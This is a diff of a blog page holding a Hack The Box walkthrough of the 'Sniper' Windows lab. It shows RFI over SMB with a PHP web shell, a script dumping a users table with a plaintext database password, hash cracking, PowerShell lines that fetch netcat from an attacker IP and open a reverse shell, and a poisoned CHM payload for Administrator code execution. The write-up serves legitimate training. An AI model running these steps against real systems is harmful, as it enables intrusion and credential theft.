@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   
-    <title>Sniper [Medium] - Windows :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
+    <title>Sniper [Hard] - Windows :: 5ysk3y Pwnz — An online resource for Hack the Box stuff</title>
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
-<meta name="description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
+<meta name="description" content="Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta name="keywords" content="HTB, Hack the Box" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://5ysk3y.github.io/htb/guides/sniper/" />
@@ -38,10 +38,10 @@
 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
-<meta property="og:title" content="Sniper [Medium] - Windows :: 5ysk3y Pwnz">
-<meta property="og:description" content="Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
+<meta property="og:title" content="Sniper [Hard] - Windows :: 5ysk3y Pwnz">
+<meta property="og:description" content="Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&amp;rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&amp;rsquo;s referenced and included as a gist for your viewing." />
 <meta property="og:url" content="https://5ysk3y.github.io/htb/guides/sniper/" />
-<meta property="og:site_name" content="Sniper [Medium] - Windows" />
+<meta property="og:site_name" content="Sniper [Hard] - Windows" />
 <meta property="og:image" content="https://5ysk3y.github.io/">
 <meta property="og:image:width" content="2048">
 <meta property="og:image:height" content="1024">
@@ -135,7 +135,7 @@
     
 <div class="post">
   <h1 class="post-title">
-    <a href="https://5ysk3y.github.io/htb/guides/sniper/">Sniper [Medium] - Windows</a></h1>
+    <a href="https://5ysk3y.github.io/htb/guides/sniper/">Sniper [Hard] - Windows</a></h1>
   <div class="post-meta">
       
     <span class="post-date">
@@ -146,11 +146,25 @@
   </div>
 
   
+  <span class="post-tags">
+    
+    #<a href="https://5ysk3y.github.io/tags/hack-the-box/">Hack The Box</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/windows/">Windows</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/hard/">Hard</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/windows-chm-exploit/">Windows CHM Exploit</a>&nbsp;
+    
+    #<a href="https://5ysk3y.github.io/tags/rfi-over-smb/">RFI over SMB</a>&nbsp;
+    
+  </span>
+  
 
   
 
   <div class="post-content"><div>
-        <p>Sniper was one of my favorite boxes from recent memory, and uses RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&rsquo;s referenced and included as a gist for your viewing.</p>
+        <p>Sniper was one of my favorite boxes from recent memory. It leverages an RFI and Powershell constrained mode to eventually get a user shell. From there you poison a Windows Help (CHM) file in order to execute code as the Administrator user. Let&rsquo;s take a look at how I did it. Please also note that the first part of this leverages a python script that I created; it&rsquo;s referenced and included as a gist for your viewing.</p>
 <hr>
 <p>First up, from my standard nmap scan, we see :</p>
 <pre><code>nmap -A -oA nmap/snipper_initial -vvv 10.10.10.151
@@ -220,22 +234,21 @@ OS and Service detection performed. Please report any incorrect results at https
 <p>Nothing special in the source. There&rsquo;s 2 links that lead off here:</p>
 <p>http://10.10.10.151/blog/
 http://10.10.10.151/user/</p>
-<p>The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment. Took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.</p>
-<p>I&rsquo;m also running full dirb scans of the /blog and /user URL&rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration.
-nd doesn&rsquo;t it give further results because of its presence</p>
+<p>The blog itself doesnt appear to be built on any CMS framework; the only significant thing I can see thus far is that it has the ability to interchange languages via a PHP URL arugment, but we&rsquo;ll revisit that shortly. I also took a copy of such a request and fed it to SQLMap for examination. It doesnt appear to have been able to find any injection points.</p>
+<p>I&rsquo;m also running full dirb scans of the /blog and /user URL&rsquo;s and, in the case the user URL, I was able to sign up and login. Once logged in you get sent to a construction page, again no useful info in the source. The dirb scan for /user includes the login cookie associated with my registration to ensure it scans everything it can, but it doesn&rsquo;t give further results.</p>
 <pre><code> ~/HTB/Boxes/Sniper/dirb cat sniper_initial.dirb | grep 200 | sort | uniq -i
 /blog (Status: 200)
 /index.php (Status: 200)
 /user (Status: 200)
-</code></pre><p>Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger.</p>
-<p>On top of this, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:</p>
+</code></pre><p>Based on intitial enumeration I found some CSS code that referenced something called “fostrap” which appears to be a theming template for Blogger. This appears to be a bit of dead end though.</p>
+<p>On top of this, as briefly mentioned, there appears to be some form of LFI/RFI expoit here; on the blog, theres only 3 working links in the sites menu, all of these follow the context of:</p>
 <p><code>/blog/?lang=blog-&lt;lang&gt;.php </code></p>
-<p>Where <!-- raw HTML omitted --> is (e.g.) en, fr, es. I&rsquo;ve attempted to fuzz the lang part of the request; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types, nothing has come back from there.</p>
+<p>Where <code>lang</code> is (e.g.) en, fr, es. I&rsquo;ve attempted to fuzz the parameter to some success; including the index.php page forces the page to include itself and that basically breaks the application for that particular load. I&rsquo;ve also tried fuzzing for .aspx and asp, as theyre common IIS file types but nothing has come back from that.</p>
 <p>After browsing around to see how this can be exploited, it turns out theres a particular vulnerability to allow exploiting of RFI in conjunction with PHP and SMB:</p>
 <p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">RFI using PHP/SMB</a></p>
-<p>This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share and inside it I&rsquo;ve got a file called hax.php (yes, I know, Its leet). It contains this:</p>
+<p>This effectively uses a PHP exploit that involves including files from remote SMB shares regardless of whether standard PHP file include restictions (fopen_url etc) are enabled. In this case, they are. So we should be able to abuse this. I&rsquo;ve setup an SMB share and inside it I&rsquo;ve got a file called hax.php (yes, I know, Its leet). Quite simply, it contains this:</p>
 <p><code>&lt;?php system($_GET['cmd']); ?&gt;</code></p>
-<p>For posterity the following reflects the codeblock used in my smb.conf file:</p>
+<p>For posterity the following also reflects the codeblock used in my smb.conf file:</p>
 <pre><code>[share]
 path = /var/www/html/pub
 writable = no
@@ -246,14 +259,14 @@ directory mode = 0555
 force user = nobody
 </code></pre><p>I&rsquo;ve also created a Gist that contains these 2 things, as well as a Python based wrapper script that can be used to execute commands on the machine directly. All of those things can be found here:</p>
 <p><a href="https://gist.github.com/5ysk3y/aeb4562d0e3473db315e41ba45bf7e3e">Sniper Gist by 5ysk3y</a></p>
-<p>To exploit this, we call our malicious file via the SMB share in the url as follows:</p>
+<p>To exploit this using this script we call our malicious file via the SMB share in the url as follows:</p>
 <blockquote>
-<p>http://10.10.10.151/blog/?lang=\10.10.14.34\share\hax.php</p>
+<p>http://10.10.10.151/blog/?lang=\\10.10.14.34\share\hax.php</p>
 </blockquote>
-<p>This returns the HTML elements of the script when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
+<p>This returns the HTML elements of the script, when we view the source; to use it, we append <code>&amp;cmd=some+command+here</code> to the url (make sure to change the request type to POST as well).</p>
 <p>From there, we can run commands, e.g:</p>
 <blockquote>
-<p>POST    /blog/?lang=\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
+<p>POST    /blog/?lang=\\10.10.14.34\share\hax.php&amp;cmd=dir+..\user\</p>
 </blockquote>
 <p>To view the contents of the /user directory (from our initial dirb scans). This shows us some cool stuff:</p>
 <pre><code>10/01/2019  08:44 AM    &lt;DIR&gt;          .
@@ -270,7 +283,7 @@ force user = nobody
 10/01/2019  08:42 AM             7,192 registration.php
 08/14/2019  10:35 PM             7,004 registration_old123123123847.php
 04/11/2019  05:23 AM    &lt;DIR&gt;          vendor
-</code></pre><p>Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement (added to creds) that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:</p>
+</code></pre><p>Looking at the old registration file above, it shows us how the form actually inserts values from the registration form into the DB&ndash; specifically it tells us the table that data gets inserted into. On top of that, the db.php file contains a full connection statement, including creds, that we can use to basically query the contents of the users table using our RFI method. After a bit of fiddling, effectively I created a new file in the SMB share (mysql.php) with the following code:</p>
 <pre><code>&lt;?php
 $con = mysqli_connect(&quot;localhost&quot;,&quot;dbuser&quot;,&quot;36mEAhz/B8xQ~2VM&quot;,&quot;sniper&quot;);
 $query = &quot;SELECT * from users&quot;;
@@ -280,7 +293,7 @@ while($output = mysqli_fetch_array($result)) {
 		print_r($output);
 }
 ?&gt;
-</code></pre><p>Fairly self explanatory; I lifted the $con variable from db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):</p>
+</code></pre><p>Hopefully this is fairly self explanatory; I lifted the $con variable from the server-side copy of db.php, adjusted the query to simply select everything from the users table, and then (the fiddly bit) was getting it to dump the contents. Which I now have :) The two users of interest (for reasons) are my own login info (via the test account I registered with):</p>
 <pre><code>Array
 (
 	[0] =&gt; 12
@@ -308,27 +321,27 @@ while($output = mysqli_fetch_array($result)) {
 	[4] =&gt; 2019-04-11 22:45:36
 	[trn_date] =&gt; 2019-04-11 22:45:36
 )
-</code></pre><p>There are more, likely from signups from other HTB users, so I&rsquo;ve dumped them all into interesting. I grabbed my own to see if I can identify and crack its hash (since I know what the pass is) before I move onto super user.</p>
+</code></pre><p>There are more, likely from signups from other HTB users, so I&rsquo;ve dumped them all for reference. I grabbed my own registered password hash to see if I can crack it (since I know what the pass is) before I move onto super user.</p>
 <p>Also, I have used my wrapper script to enum the users on this box:</p>
 <pre><code>04/09/2019  06:47 AM    &lt;DIR&gt;          Administrator
 04/11/2019  07:04 AM    &lt;DIR&gt;          Chris
 
-</code></pre><p>Sadly I cant dir the contents but non the less! I&rsquo;ve also just realised that the old registration form tells us exactly what type of hash the DB passwords are stored in, as its inserted in the following manner:</p>
+</code></pre><p>Sadly I cant dir the contents but non the less! I&rsquo;ve also just realised that the old registration form tells us exactly what type of format the DB passwords are stored in, as its inserted in the following manner:</p>
 <p>.md5($password).</p>
 <p>So its an MD5 hash. Lets try to crack our own! Hashcat got it:</p>
 <pre><code>hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
 5f4dcc3b5aa765d61d8327deb882cf99:password
-</code></pre><p>Sadly the sysadmin password didnt seem to crack quite as easily (john is at it as we speak) - SSH isnt available on this server as it&rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell, away from the web shell were currently using, the better.</p>
+</code></pre><p>Sadly the sysadmin password didnt seem to crack quite as easily - SSH isnt available on this server as it&rsquo;s a Windows box, so its likely we will need to priv esc, meaning the sooner we can get a stable shell the better.</p>
 <p>In order to get a stable shell, I had to supply my own netcat binary to Windows and then use that directly. Specifically:</p>
 <ol>
 <li>Upload nc64 (windows netcat, using this specific command):</li>
 </ol>
 <p><code>python exploit.py &quot;powershell.exe -nop -exec bypass -c Invoke-WebRequest -Uri http://10.10.14.23:9001/nc64.exe -OutFile C:\\Windows\\temp\\nc64.exe&quot;</code></p>
 <ol start="2">
-<li>This will serve the console the nc64 file and save it in Windows temp dir. Then call it using the same powershell syntax and ensure you have netcat listening:</li>
+<li>This will serve nc64 and save it in Windows temp dir. We can then call it using the same powershell syntax, ensuring you have netcat listening:</li>
 </ol>
 <p><code>python exploit.py &quot;powershell.exe -nop -exec bypass -c C:\\Windows\\temp\\nc64.exe 10.10.14.23 9002 -e powershell&quot;</code></p>
-<p>From there we can use our enumerated data to get user; we know the username is Chris, and we have a valid password - not many passwords have been found up to now, but attempting to use Chris&rsquo; username with the MySQL password we found earlier does yield results. Let&rsquo;s setup our credential object:</p>
+<p>From there we can use our enumerated data to login as the user account; we know the username is Chris, and some trial and error logins to crackmapexec show we also have a valid password from the databsae file - not many passwords have been found up to now, but attempting to use Chris&rsquo; username with the MySQL password we found earlier does yield results. Let&rsquo;s setup our credential object so we can privesc:</p>
 <pre><code>$user = &quot;SNIPER\Chris&quot;
 $pass = ConvertTo-SecureString &quot;36mEAhz/B8xQ~2VM&quot; -AsPlainText -Force
 $creds = New-Object System.Management.Automation.PSCredential($user,$pass)
@@ -378,9 +391,9 @@ odbcinst.chm                                                C:\Windows\Help\mui\
 odbcjet.chm                                                 C:\Windows\Help\mui\0409
 sqlsodbc.chm                                                C:\Windows\Help\mui\0409
 </code></pre><p>I&rsquo;ve downloaded a copy of this (via SMB) in order to look into it further.</p>
-<p>Yep, in a nutshell this is a poisoned CHM exploit:</p>
+<p>In a nutshell this is going to be a poisoned CHM exploit:</p>
 <p><a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7">Poison CHM Gist</a></p>
-<p>Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called KeyTools - this allows you to decompile CHM files so their contents can be modified. This isn&rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:</p>
+<p>Lets do this manually first. On a Windows machine I decompiled the CHM file we got from Chris using something called <a href="http://keyworks.helpmvp.com/home/keytools">KeyTools</a> - this allows you to decompile CHM files so their contents can be modified. This isn&rsquo;t necessary but I chose to do it as a learning exercise. Once extracted, I created a copy of the single html file in there, and added the exploit as described in the above link:</p>
 <pre><code>&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;
   &lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;
   &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;
@@ -424,7 +437,6 @@ PS C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
         <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
-        <span> :: Updated by <a href="https://twitter.com/5ysk3y">5ysk3y</a></span>
       </div>
   </div>
 </footer>
